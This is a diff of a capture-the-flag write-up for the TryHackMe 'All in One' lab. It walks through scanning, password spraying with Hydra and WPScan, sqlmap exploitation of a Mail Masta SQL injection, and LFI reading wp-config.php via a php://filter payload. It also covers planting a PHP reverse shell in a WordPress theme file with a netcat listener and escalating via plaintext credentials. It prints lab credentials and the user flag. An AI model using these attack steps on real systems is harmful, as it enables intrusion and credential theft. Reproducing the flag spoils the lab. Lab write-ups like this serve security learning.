@@ -1,9 +1,13 @@
 # All in One
 ## Information Gathering
-## Enumeration and Scanning
+* N/A
 ```
 mkdir ~/Desktop/AllinOne
 cd ~/Desktop/AllinOne
+```
+## Enumeration and Scanning
+#### Nmap scanning
+```
 nmap -sT -sV -O -p- --script "vuln" -T5 -oN TARGET_IP_scan.nmap TARGET_IP
 ```
 ```
@@ -20,6 +24,8 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
 ```
+* TCP/21,22, and 80 open.
+* Refine nmap scan to enumerate ports.
 ```
 nmap -p21,22,80 --script "safe" -T5 -oN TARGET_IP_scan1.nmap TARGET_IP
 ```
@@ -127,16 +133,16 @@ PORT   STATE SERVICE
 |_    WWW-Mechanize/1.34
 |_http-xssed: No previously reported XSS vuln.
 ```
-### Nessus scan results.
+#### Nessus scanning
 * 4 x medium severity.
-  * SSH Terrapin Prefix Truncation Weakness (CVE-2023-48795) is only vulnerability with public exploit.
+  * SSH Terrapin Prefix Truncation Weakness (CVE-2023-48795) has exploit.
 * 2 x Low severity.
   * No public exploits.
 
 ## Application Testing
 ### TCP/21
-* vsftpd 3.0.3
-* Connected anonymously - no files or folders exposed.
+* vsftpd 3.0.3 application.
+  * Connected anonymously - no files or folders exposed.
 ```
 ftp 10.10.74.123
 Connected to 10.10.74.123.
@@ -156,7 +162,7 @@ drwxr-xr-x    2 0        115          4096 Oct 06  2020 ..
 ftp>bye
 ```
 ### TCP/22
-* OpenSSH 7.6p1.
+* OpenSSH 7.6p1 application.
   * Could not connect anonymously.
 ```
 ssh anonymous@TARGET_IP
@@ -168,7 +174,8 @@ anonymous@TARGET_IP's password:
 Permission denied, please try again.
 ```
 ### TCP/80
-* Search for hidden directories using Gobuster.
+* Apache 2.4.29 webserver.
+* Use GoBuster to search for hidden directories.
 ```
 gobuster dir --url http://TARGET_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt 
 ```
@@ -177,7 +184,7 @@ gobuster dir --url http://TARGET_IP/ -w /usr/share/wordlists/SecLists/Discovery/
 /hackathons (Status: 200)
 /server-status (Status: 403)
 ```
-#### /wordpress/
+#### /wordpress directory
 * "All in One" page published with "elyana" as author.
 * Enumerate Wordpress users using Metasploit.
 ```
@@ -193,12 +200,20 @@ msf auxiliary(wordpress_login_enum) > exploit
 [...snip...]
 [*] /wordpress/ - WordPress User-Validation - Checking Username:'elyana'
 [+] /wordpress/ - WordPress User-Validation - Username: 'elyana' - is VALID
-
 ```
 #### wordpress/wp-login.php
-* Internet search reveals that default Wordpress credentials are admin / password.
- * Trying these resulted in "Unknown username. Check again or try your email address." message.
- * Attempting to logon using username "elyana" results in "Error: The password you entered for the username elyana is incorrect." message.
+* Internet search reveals default Wordpress credentials are admin / password.
+
+#### "wpscan" scan to enumerate WordPress.
+```
+wpscan --update
+wpscan --url http://TARGET_IP/Wordpress > wpscan.txt
+```
+* WordPress v5.5.1.
+* twentytwenty theme v1.5.
+* Mail Masta plugin v1.0.
+* Reflex Gallery 3.1.7.
+
 #### /hackathons directory
 * Displays "Damn how much I hate the smell of *Vinegar :/* !!!" 
 * Viewing page source displays comments at bottom of page.
@@ -206,24 +221,16 @@ msf auxiliary(wordpress_login_enum) > exploit
 <!-- Dvc W@iyur@123 -->
 <!-- KeepGoing -->
 ```
+
 ## Vulnerablity Research
 ### vsftpd 3.0.3
 * No public exploits listed on Exploit db.
 ### OpenSSH 7.6p1.
 * Vulnerable to CVE-2018-15473 - username enumeration (https://www.exploit-db.com/exploits/4521080)
-  * Enumerate openSSH users?
+* SSH Terrapin Prefix Truncation Weakness (CVE-2023-48795) not listed on Exploit db.
 ### Apache 2.4.29
 * No public exploits on Exploit db.
 ### WordPress
-* [wp-config.php](https://developer.wordpress.org/apis/wp-config-php/)
-> One of the most important files in your WordPress installation is the wp-config.php file. This file is located in the root of your WordPress file directory and contains your website’s base configuration details, such as database connection information.
-* [How to configure an Apache web server](https://opensource.com/article/18/2/apache-web-server-configuration).
-> The DocumentRoot directive specifies the location of the HTML files that make up the pages of the website. That line does not need to be changed because it already points to the standard location. The line should look like this: DocumentRoot "/var/www/html"
-* Use "wpscan" to identify WordPress vulnerabilites.
-```
-wpscan --update
-wpscan --url http://TARGET_IP/Wordpress > wpscan.txt
-```
 * WordPress v5.5.1.
   * v6.5 Beta 2 is current.
   * No public exploits listed on Exploit db.
@@ -237,28 +244,37 @@ wpscan --url http://TARGET_IP/Wordpress > wpscan.txt
 > The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.
 * Reflex Gallery 3.1.7.
   * No public exploits listed on Exploit db.
+* [wp-config.php](https://developer.wordpress.org/apis/wp-config-php/)
+> One of the most important files in your WordPress installation is the wp-config.php file. This file is located in the root of your WordPress file directory and contains your website’s base configuration details, such as database connection information.
+* [How to configure an Apache web server](https://opensource.com/article/18/2/apache-web-server-configuration).
+> The DocumentRoot directive specifies the location of the HTML files that make up the pages of the website. That line does not need to be changed because it already points to the standard location. The line should look like this: DocumentRoot "/var/www/html"
+ Use "wpscan" to identify WordPress vulnerabilites.
+
 ## Exploitation
 ### Initial Access
-#### Password spray SSH using Hydra.
+#### Password spray SSH using Hydra
 ```
 hydra -l elyana -P /usr/share/wordlists/passwords/rockyou.txt TARGET_IP -t 4 ssh -vV
 ```
   * THM target host timed out before completion.
-#### Password spray WordPress using Hydra.
+* Enumerate openSSH users using https://www.exploit-db.com/exploits/4521080?
+#### Use default credentials to logon to /wp-login.php
+* Admin / password resulted in "Unknown username. Check again or try your email address." message. 
+ * Attempting to logon using username "elyana" results in "Error: The password you entered for the username elyana is incorrect." message.
+#### Password spray /wp-login.php using Hydra
 ```
 hydra -l elyana -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2FTARGET_IP%2Fwordpress%2Fwp-admin%2F&testcookie=1:Error" -T 64 -vV
 ```
   * Aborted as too slow - max 4 parallel threads.
-#### Password spray WordPress using WPscan.
+#### Password spray WordPress using WPscan
 ```
 sudo wpscan --password-attack xmlrpc -t 20 -U elyana -P /usr/share/wordlists/rockyou.txt --url http://TARGET_IP/wordpress/
 ```
   * THM target host timed out before completion.
 
 #### Exploit Mail Masta SQLi.
-* Page `./wp-content/plugins/mail-masta/inc/lists/csvexport.php` (Unauthenticated).
-* GET parameter:`list_id`.
-**Enumerate databases**
+> Mail-Masta SQL Injection. Page: ./wp-content/plugins/mail-masta/inc/lists/csvexport.php (Unauthenticated). GET Parameter: list_id. http://my_wp_app/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0+OR+1%3D1&pl=/var/www/html/wordpress/wp-load.php.
+**Enumerate databases using SQLMap**
 ```
 sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" --dbs
 ```
@@ -269,7 +285,7 @@ available databases [2]:
 [*] information_schema
 [*] wordpress
 ```
-**List tables within "wordpress" database**
+**List tables within "wordpress" database using SQLMap**
 ```
 sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" -D wordpress --tables
 
@@ -301,7 +317,7 @@ Database: wordpress
 | wp_users                   |
 +----------------------------+
 ```
-**List columns within "wp_users" table**
+**List columns within "wp_users" table using SQLMap**
 ```
 sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" -D wordpress -D wordpress -T wp_users --columns
 
@@ -323,7 +339,7 @@ Table: wp_users
 | user_url            | varchar(100)        |
 +---------------------+---------------------+
 ```
-**Dump contents of "wp_users" table**
+**Dump contents of "wp_users" table using SQLMap**
 ```
 Database: wordpress
 Table: wp_users
@@ -380,11 +396,11 @@ sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
 ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
 ```
   * Elyana user is only other user other than root with "/bin/bash" shell access.
-**Read "wp-config.php" with LFI**
+**Read "wp-config.php" using LFI**
 ```
 curl http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/www/html/wordpress/wp-config.php -v
 ```
-* This failed to return any data despite 200 response code.
+* This failed to return any data despite 200 (success) response code.
 > **[PHP Filter](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)**. Used to access the local file system; this is a case insensitive wrapper that provides the capability to apply filters to a stream at the time of opening a file. This wrapper can be used to get content of a file preventing the server from executing it. For example, allowing an attacker to read the content of PHP files to get source code to identify sensitive information such as credentials or other exploitable vulnerabilities. The wrapper can be used like `php://filter/convert.base64-encode/resource=FILE` where `FILE` is the file to retrieve. As a result of the usage of this execution, the content of the target file would be read, encoded to base64 (this is the step that prevents the execution server-side), and returned to the User-Agent.
 ```
 curl http://10.10.74.154/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php -v
@@ -392,7 +408,7 @@ curl http://10.10.74.154/wordpress/wp-content/plugins/mail-masta/inc/campaign/co
 PD9waHANCi8qKg0KICogVGhlIGJhc2UgY29uZmlndXJhdGlvbiBmb3IgV29yZFByZXNzDQogKg0KICogVGhlIHdwLWNvbmZpZy5waHAgY3JlYXRpb24gc2NyaXB0IHVzZXMgdGhpcyBmaWxlIGR1cmluZyB0aGUNCiAqIGluc3RhbGxhdGlvbi4gWW91IGRvbid0IGhhdmUgdG8gdXNlIHRoZSB3ZWIgc2l0ZSwgeW91IGNhbg0KICogY29weSB0aGlzIGZpbGUgdG8gIndwLWNvbmZpZy5waHAiIGFuZCBmaWxsIGluIHRoZSB2YWx1ZXMuDQogKg0KICogVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBmb2xsb3dpbmcgY29uZmlndXJhdGlvbnM6DQogKg0KICogKiBNeVNRTCBzZXR0aW5ncw0KICogKiBTZWNyZXQga2V5cw0KICogKiBEYXRhYmFzZSB0YWJsZSBwcmVmaXgNCiAqICogQUJTUEFUSA0KICoNCiAqIEBsaW5rIGh0dHBzOi8vd29yZHByZXNzLm9yZy9zdXBwb3J0L2FydGljbGUvZWRpdGluZy13cC1jb25maWctcGhwLw0KICoNCiAqIEBwYWNrYWdlIFdvcmRQcmVzcw0KICovDQoNCi8vICoqIE15U1FMIHNldHRpbmdzIC0gWW91IGNhbiBnZXQgdGhpcyBpbmZvIGZyb20geW91ciB3ZWIgaG9zdCAqKiAvLw0KLyoqIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZSBmb3IgV29yZFByZXNzICovDQpkZWZpbmUoICdEQl9OQU1FJywgJ3dvcmRwcmVzcycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHVzZXJuYW1lICovDQpkZWZpbmUoICdEQl9VU0VSJywgJ2VseWFuYScgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICdIQGNrbWVAMTIzJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0Kd29yZHByZXNzOw0KZGVmaW5lKCAnV1BfU0lURVVSTCcsICdodHRwOi8vJyAuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLicvd29yZHByZXNzJyk7DQpkZWZpbmUoICdXUF9IT01FJywgJ2h0dHA6Ly8nIC4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJy93b3JkcHJlc3MnKTsNCg0KLyoqI0ArDQogKiBBdXRoZW50aWNhdGlvbiBVbmlxdWUgS2V5cyBhbmQgU2FsdHMuDQogKg0KICogQ2hhbmdlIHRoZXNlIHRvIGRpZmZlcmVudCB1bmlxdWUgcGhyYXNlcyENCiAqIFlvdSBjYW4gZ2VuZXJhdGUgdGhlc2UgdXNpbmcgdGhlIHtAbGluayBodHRwczovL2FwaS53b3JkcHJlc3Mub3JnL3NlY3JldC1rZXkvMS4xL3NhbHQvIFdvcmRQcmVzcy5vcmcgc2VjcmV0LWtleSBzZXJ2aWNlfQ0KICogWW91IGNhbiBjaGFuZ2UgdGhlc2UgYXQgYW55IHBvaW50IGluIHRpbWUgdG8gaW52YWxpZGF0ZSBhbGwgZXhpc3RpbmcgY29va2llcy4gVGhpcyB3aWxsIGZvcmNlIGFsbCB1c2VycyB0byBoYXZlIHRvIGxvZyBpbiBhZ2Fpbi4NCiAqDQogKiBAc2luY2UgMi42LjANCiAqLw0KZGVmaW5lKCAnQVVUSF9LRVknLCAgICAgICAgICd6a1klbSVSRlliOnUsL2xxLWlafjhmakVOZElhU2I9Xms8M1pyLzBEaUxacVB4enxBdXFsaTZsWi05RFJhZ0pQJyApOw0KZGVmaW5lKCAnU0VDVVJFX0FVVEhfS0VZJywgICdpQVlhazxfJn52OW8re2JAUlBSNjJSOSBUeS0gNlUteUg1YmFVRHs7bmRTaUNbXXFvc3hTQHNjdSZTKWQkSFtUJyApOw0KZGVmaW5lKCAnTE9HR0VEX0lOX0tFWScsICAgICdhUGRfKnNCZj1adWMrK2FdNVZnOT1QfnUwM1EsenZwW2VVZS99KUQ9Ok55aFVZe0tYUl10N300MlVwa1tyNz9zJyApOw0KZGVmaW5lKCAnTk9OQ0VfS0VZJywgICAgICAgICdAaTtUKHt4Vi9mdkUhcyteZGU3ZTRMWDN9TlRAIGo7YjRbejNfZkZKYmJXKG5vIDNPN0ZAc3gwIW95KE9gaCNNJyApOw0KZGVmaW5lKCAnQVVUSF9TQUxUJywgICAgICAgICdCIEFUQGk+KiBOI1c8biEqfGtGZE1uUU4pPl49XihpSHA4VXZnPH4ySH56Rl1pZHlRPXtAfTF9KnJ7bFowLFdZJyApOw0KZGVmaW5lKCAnU0VDVVJFX0FVVEhfU0FMVCcsICdoeDhJOitUejhuMzM1V2htels+JFVaOzhyUVlLPlJ6XVZHeUJkbW83PSZHWiFMTyxwQU1zXWYhelZ9eG46NEFQJyApOw0KZGVmaW5lKCAnTE9HR0VEX0lOX1NBTFQnLCAgICd4N3I+fGMwTUxecztTdzIqVSF4LntgNUQ6UDF9Vz0gL2Npe1E8dEVNPXRyU3YxZWVkfF9mc0xgeV5TLFhJPFJZJyApOw0KZGVmaW5lKCAnTk9OQ0VfU0FMVCcsICAgICAgICd2T2IlV3R5fSR6eDlgfD40NUlwQHN5WiBdRzpDM3xTZEQtUDM8e1lQOi5qUERYKUh9d0dtMSpKXk1TYnMkMWB8JyApOw0KDQovKiojQC0qLw0KDQovKioNCiAqIFdvcmRQcmVzcyBEYXRhYmFzZSBUYWJsZSBwcmVmaXguDQogKg0KICogWW91IGNhbiBoYXZlIG11bHRpcGxlIGluc3RhbGxhdGlvbnMgaW4gb25lIGRhdGFiYXNlIGlmIHlvdSBnaXZlIGVhY2gNCiAqIGEgdW5pcXVlIHByZWZpeC4gT25seSBudW1iZXJzLCBsZXR0ZXJzLCBhbmQgdW5kZXJzY29yZXMgcGxlYXNlIQ0KICovDQokdGFibGVfcHJlZml4ID0gJ3dwXyc7DQoNCi8qKg0KICogRm9yIGRldmVsb3BlcnM6IFdvcmRQcmVzcyBkZWJ1Z2dpbmcgbW9kZS4NCiAqDQogKiBDaGFuZ2UgdGhpcyB0byB0cnVlIHRvIGVuYWJsZSB0aGUgZGlzcGxheSBvZiBub3RpY2VzIGR1cmluZyBkZXZlbG9wbWVudC4NCiAqIEl0IGlzIHN0cm9uZ2x5IHJlY29tbWVuZGVkIHRoYXQgcGx1Z2luIGFuZCB0aGVtZSBkZXZlbG9wZXJzIHVzZSBXUF9ERUJVRw0KICogaW4gdGhlaXIgZGV2ZWxvcG1lbnQgZW52aXJvbm1lbnRzLg0KICoNCiAqIEZvciBpbmZvcm1hdGlvbiBvbiBvdGhlciBjb25zdGFudHMgdGhhdCBjYW4gYmUgdXNlZCBmb3IgZGVidWdnaW5nLA0KICogdmlzaXQgdGhlIGRvY3VtZW50YXRpb24uDQogKg0KICogQGxpbmsgaHR0cHM6Ly93b3JkcHJlc3Mub3JnL3N1cHBvcnQvYXJ0aWNsZS9kZWJ1Z2dpbmctaW4td29yZHByZXNzLw0KICovDQpkZWZpbmUoICdXUF9ERUJVRycsIGZhbHNlICk7DQoN* Connection #0 to host 10.10.74.154 left intact
 Ci8qIFRoYXQncyBhbGwsIHN0b3AgZWRpdGluZyEgSGFwcHkgcHVibGlzaGluZy4gKi8NCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3A
 ```
-* Decoded Base64 in BurpSuite Decoder tool.
+**Decode Base64 in BurpSuite Decoder tool**
 ```
 <?php
 /**
@@ -492,7 +508,7 @@ if ( ! defined( 'ABSPATH' ) ) {
 /** Sets up WordPress vars and included files. */
 require_once ABSPATH . 'd3A
 ```
-* Successfully logged into WordPress "/wp-admin" using MySQL db credentials.
+#### Logged into /wp-admin using MySQL db credentials
   * elyana / H@ckme@123
 * Credentials are invalid for SSH.
 ```
@@ -504,6 +520,7 @@ Warning: Permanently added '10.10.199.13' (ECDSA) to the list of known hosts.
 elyana@10.10.199.13's password: 
 Permission denied, please try again.
 ```
+#### Upload reverse shell to WordPress
 * WordPress Appearance > Theme Editor.
 * Open "Theme Header" (header.php) from "Theme Files" list.
 * Copy "php-reverse-shell.php" to working folder.
@@ -514,12 +531,12 @@ cp /usr/share/webshells/php/php-reverse-shell.php ~/Desktop/AllinOne
 * Edit "ip" field.
 * Save and close file.
 * Copy and paste code from reverse shell to top of "header.php" file in WordPress.
-* Start netcat listener on attack host.
+#### Start netcat listener on attack host
 ```
 nc -lvnp 1234
 ```
 * "Update File" in WordPress to save changes and launch remote shell.
-* Shell caught by listener.
+#### Shell caught by listener
 ```
 Connection from 10.10.199.13 44038 received!
 Linux elyana 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
@@ -530,12 +547,12 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ whoami
 www-data
 ```
-* Stabilise netcat shell.
+#### Stabilise netcat shell
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 ## Privilege Escalation
-* Find user.txt flag.
+#### Find "user.txt" flag
 ```
 cd /home/elanya
 ```
@@ -544,7 +561,7 @@ cd /home/elanya
 -rw------- 1 elyana elyana   61 Oct  6  2020 user.txt
 ```
 * "hint.txt" contains "Elyana's user password is hidden in the system. Find it ;)".
-* Find all files owned by elyana.
+**Find all files owned by elyana**
 ```
 find / -user elyana -type f 2>/dev/null
 
@@ -557,7 +574,7 @@ find / -user elyana -type f 2>/dev/null
 /home/elyana/.bashrc
 /etc/mysql/conf.d/private.txt
 ```
-* "/etc/mysql/conf.d/private.txt" is readable by "www-data" user and contains credentials.
+* "/etc/mysql/conf.d/private.txt" is readable by "www-data" and contains credentials.
 ```
 ls -la /etc/mysql/conf.d/pricate.txt
 -rwxrwxrwx 1 elyana elyana   34 Oct  5  2020 private.txt
@@ -566,15 +583,17 @@ cat /etc/mysql/conf.d/private.txt
 user: elyana
 password: E@syR18ght
 ```
-* Credentials allowed SSH access to target host.
+**Credentials allow SSH access to target host**
 ```
 ssh elyana@10.10.199.13
 elyana@10.10.199.13's password: 
 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)
 [snip ...]
 ```
-* Recovered "user.txt" flag: `VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259`.
-  * Decoded Base64 string in CyberChef.
+**Recovered flag** 
+* `VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259`.
+* Decoded Base64 string in CyberChef.
+    
 * Elyana user has "sudo -l" devolved privileges.
 ```
 id
